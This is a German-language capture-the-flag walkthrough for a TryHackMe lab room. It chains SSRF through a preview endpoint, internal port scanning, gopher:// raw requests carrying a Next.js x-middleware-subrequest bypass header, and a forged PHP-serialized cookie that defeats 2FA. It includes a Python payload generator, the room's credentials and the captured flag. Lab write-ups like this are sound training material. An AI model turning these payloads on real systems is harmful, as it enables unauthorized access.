# TryHackMe Extract - Referenz (Patch-Stand)

## Ziel
Diese Referenz dokumentiert den funktionierenden Angriffspfad in der gepatchten Room-Version.
Der alte LFI-Bypass ueber `file://` ist nicht mehr der primare Weg.

## Kurzfassung
1. SSRF ueber `preview.php?url=` bestaetigen.
2. Interne Ports ueber SSRF scannen.
3. Offenen internen Dienst auf `127.0.0.1:10000` finden (Next.js).
4. Mit `gopher://` einen Raw-Request inklusive `x-middleware-subrequest` senden.
5. Internes Management-Login per Gopher-POST auf Port 80.
6. `auth_token`-Cookie (serialized object) fuer 2FA-Bypass setzen.
7. Flag auf `/management/2fa.php` auslesen.

---

## 1) SSRF bestaetigen
Beispiel:

```text
http://TARGET/preview.php?url=http://example.com
```

Wenn sich die Antwort mit der URL aendert, ist SSRF bestaetigt.

---

## 2) Interne Ports fuzzing
Wichtiger Punkt nach Patch: offener interner Port ist die Schluesselstelle.
Bei uns war relevant:

- `127.0.0.1:80`
- `127.0.0.1:10000`

`10000` liefert Next.js-Response.

---

## 3) Next.js Middleware-Bypass via Gopher
Raw HTTP Request (im Gopher-Payload):

```http
GET /customapi HTTP/1.1
Host: 127.0.0.1
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

```

Generierung (Beispiel):

```python
import urllib.parse
req = (
  "GET /customapi HTTP/1.1\r\n"
  "Host: 127.0.0.1\r\n"
  "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n"
  "\r\n"
)
u = "gopher://127.0.0.1:10000/_" + urllib.parse.quote(req, safe='')
print("http://TARGET/preview.php?url=" + urllib.parse.quote(u, safe=''))
```

---

## 4) Interner Login per Gopher (Port 80)
Credentials:

- username: `librarian`
- password: `L1br4r1AN!!`

Raw POST:

```http
POST /management/index.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: ...
Connection: close

username=librarian&password=L1br4r1AN!!
```

Erwartung:
- `302 Found`
- `Set-Cookie: PHPSESSID=...`
- `Set-Cookie: auth_token=...validated=false...`

---

## 5) 2FA-Bypass ueber manipulierten auth_token
Cookie fuer Folgerequest:

- `PHPSESSID=<aus Login-Antwort>`
- `auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D`

Raw GET:

```http
GET /management/2fa.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<SESSION>; auth_token=<SERIALIZED_TOKEN>
Connection: close

```

Erwartung: Erfolgsseite mit zweiter Flag.

---

## Ergebnis (deine Session)
Zweite Flag:

`THM{804326748394ff9fb288e059653f0db7}`

---

## Warum dieser Weg nach Patch funktioniert
- `file:/`-Filter blockt den alten LFI-Weg.
- SSRF bleibt aber vorhanden.
- Interne Dienste sind ueber SSRF erreichbar.
- Gopher erlaubt Raw-HTTP Requests inkl. custom Header/Cookies.
- Dadurch lassen sich interne Auth-/Middleware-Mechanismen gezielt umgehen.

---

## Praktische Hinweise
- Wenn `redirect_server.py` mit Exit Code 1 endet, ist Port 8000 oft schon belegt.
- Auf Windows ggf. alten Python-Prozess beenden oder freien Port nehmen.
- Bei wechselnder THM-Instanz koennen Session IDs und Flag-Werte anders sein.
